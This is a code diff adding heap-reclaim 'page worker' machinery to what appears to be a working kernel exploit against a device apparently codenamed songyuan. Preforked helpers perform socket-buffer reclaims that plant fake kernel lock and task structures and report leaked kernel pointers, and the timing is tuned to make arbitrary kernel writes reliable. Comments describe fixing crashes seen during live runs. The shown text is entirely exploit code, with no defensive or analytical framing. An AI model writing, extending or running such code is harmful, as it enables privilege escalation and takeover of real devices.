@@ -1626,6 +1626,203 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
   return 0;
 }
 
+/* Prepare reclaimed payload pages just in time, without forking from the
+ * launcher after kernel writes have begun.  Every helper is forked while the
+ * launcher is pristine, then sleeps on a private command pipe.  Once asked,
+ * it performs one reclaim, reports the addresses, and stays alive with its
+ * skb sockets open until the corresponding write has completed.
+ *
+ * Pre-staging every page made a reclaim miss dangerous: a nominal page could
+ * remain allocator-owned for several later reclaim rounds, and the live
+ * songyuan panic showed fake_lock->owner changing to 3 in that interval.
+ * The just-in-time worker cuts that exposure to the pipe hand-off plus the
+ * already-preforked native trigger; no clone/fork occurs in the launcher. */
+#define SONGYUAN_PAGE_WORKER_MAX 16
+
+struct songyuan_page_worker {
+  pid_t pid;
+  int command_fd;
+  int result_fd;
+  int acquired;
+  int released;
+};
+
+static struct songyuan_page_worker page_workers[SONGYUAN_PAGE_WORKER_MAX];
+static size_t page_worker_count;
+static size_t page_worker_next;
+
+static ssize_t page_worker_transfer(int fd, void *buffer, size_t size,
+                                    int writing) {
+  size_t offset = 0;
+  while (offset < size) {
+    ssize_t done = writing
+        ? write(fd, (const char *)buffer + offset, size - offset)
+        : read(fd, (char *)buffer + offset, size - offset);
+    if (done < 0 && errno == EINTR)
+      continue;
+    if (done <= 0)
+      return done;
+    offset += (size_t)done;
+  }
+  return (ssize_t)offset;
+}
+
+int songyuan_page_workers_prepare(size_t count) {
+  if (!count || count > SONGYUAN_PAGE_WORKER_MAX || page_worker_count) {
+    pr_warning("page worker prepare invalid count=%zu existing=%zu\n",
+               count, page_worker_count);
+    return 0;
+  }
+
+  (void)signal(SIGPIPE, SIG_IGN);
+  int command[SONGYUAN_PAGE_WORKER_MAX][2];
+  int result[SONGYUAN_PAGE_WORKER_MAX][2];
+  pid_t pids[SONGYUAN_PAGE_WORKER_MAX];
+  memset(command, -1, sizeof(command));
+  memset(result, -1, sizeof(result));
+  memset(pids, 0, sizeof(pids));
+
+  for (size_t i = 0; i < count; ++i) {
+    if (pipe2(command[i], O_CLOEXEC) != 0 ||
+        pipe2(result[i], O_CLOEXEC) != 0) {
+      pr_warning("page worker pipe index=%zu errno=%d\n", i, errno);
+      goto fail;
+    }
+  }
+
+  for (size_t i = 0; i < count; ++i) {
+    pid_t pid = fork();
+    if (pid < 0) {
+      pr_warning("page worker fork index=%zu errno=%d\n", i, errno);
+      goto fail;
+    }
+    if (pid == 0) {
+      (void)prctl(PR_SET_PDEATHSIG, SIGKILL);
+      if (getppid() == 1)
+        _exit(1);
+
+      int command_fd = command[i][0];
+      int result_fd = result[i][1];
+      /* Native trigger workers already exist.  Close every inherited app and
+       * worker descriptor except this helper's two private pipe ends so a
+       * failed trigger cannot be kept artificially alive by this process. */
+      for (int fd = 3; fd < 65536; ++fd) {
+        if (fd != command_fd && fd != result_fd)
+          close(fd);
+      }
+
+      char op = 0;
+      if (page_worker_transfer(command_fd, &op, 1, 0) != 1 || op != 'P')
+        _exit(1);
+
+      struct songyuan_page_result prepared;
+      memset(&prepared, 0, sizeof(prepared));
+      prepared.page = prepare_good_kernel_page(PAGE_PAYLOAD_EXP32);
+      prepared.lock = fake_lock;
+      prepared.task = fake_task;
+      prepared.leaked_mm = last_leaked_mm;
+      prepared.send_size = last_skb_send_size;
+      prepared.reclaim_sent = last_skb_reclaim_sent;
+      prepared.reclaim_want = last_skb_reclaim_want;
+      prepared.worker_index = i;
+      if (page_worker_transfer(result_fd, &prepared, sizeof(prepared), 1) !=
+          (ssize_t)sizeof(prepared))
+        _exit(1);
+
+      /* Keeping this process alive keeps every reclaim skb queued. */
+      op = 0;
+      (void)page_worker_transfer(command_fd, &op, 1, 0);
+      close_reclaim_sockets();
+      close(command_fd);
+      close(result_fd);
+      _exit(prepared.page && prepared.lock && prepared.task ? 0 : 1);
+    }
+    pids[i] = pid;
+  }
+
+  for (size_t i = 0; i < count; ++i) {
+    close(command[i][0]);
+    close(result[i][1]);
+    page_workers[i].pid = pids[i];
+    page_workers[i].command_fd = command[i][1];
+    page_workers[i].result_fd = result[i][0];
+  }
+  page_worker_count = count;
+  page_worker_next = 0;
+  pr_info("page workers prepared count=%zu before kernel writes\n", count);
+  return 1;
+
+fail:
+  for (size_t i = 0; i < count; ++i) {
+    if (pids[i] > 0)
+      (void)kill(pids[i], SIGKILL);
+    for (int end = 0; end < 2; ++end) {
+      if (command[i][end] >= 0)
+        close(command[i][end]);
+      if (result[i][end] >= 0)
+        close(result[i][end]);
+    }
+  }
+  for (size_t i = 0; i < count; ++i) {
+    if (pids[i] > 0)
+      while (waitpid(pids[i], NULL, 0) < 0 && errno == EINTR) {}
+  }
+  return 0;
+}
+
+int songyuan_page_worker_acquire(struct songyuan_page_result *result) {
+  if (!result || page_worker_next >= page_worker_count) {
+    pr_warning("page worker unavailable used=%zu count=%zu\n",
+               page_worker_next, page_worker_count);
+    return 0;
+  }
+  size_t index = page_worker_next++;
+  struct songyuan_page_worker *worker = &page_workers[index];
+  char op = 'P';
+  pr_info("page worker dispatch index=%zu pid=%d\n", index,
+          (int)worker->pid);
+  if (page_worker_transfer(worker->command_fd, &op, 1, 1) != 1 ||
+      page_worker_transfer(worker->result_fd, result, sizeof(*result), 0) !=
+          (ssize_t)sizeof(*result)) {
+    pr_warning("page worker acquire failed index=%zu errno=%d\n",
+               index, errno);
+    return 0;
+  }
+  worker->acquired = 1;
+  pr_info("page worker ready index=%zu page=%016zx lock=%016zx task=%016zx "
+          "leaked=%016zx sends=%d/%d bytes=%zu\n",
+          index, result->page, result->lock, result->task,
+          result->leaked_mm, result->reclaim_sent, result->reclaim_want,
+          result->send_size);
+  return result->page && result->lock && result->task;
+}
+
+void songyuan_page_worker_release(size_t worker_index) {
+  if (worker_index >= page_worker_count)
+    return;
+  struct songyuan_page_worker *worker = &page_workers[worker_index];
+  if (worker->released)
+    return;
+  char op = 'R';
+  if (worker->command_fd >= 0) {
+    (void)page_worker_transfer(worker->command_fd, &op, 1, 1);
+    close(worker->command_fd);
+    worker->command_fd = -1;
+  }
+  if (worker->result_fd >= 0) {
+    close(worker->result_fd);
+    worker->result_fd = -1;
+  }
+  int status = 0;
+  pid_t waited;
+  do {
+    waited = waitpid(worker->pid, &status, 0);
+  } while (waited < 0 && errno == EINTR);
+  worker->released = 1;
+  pr_info("page worker released index=%zu waited=%d status=%d\n",
+          worker_index, (int)waited, status);
+}
+
 ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
   unsigned char blob[128];
   memset(blob, 0, sizeof(blob));
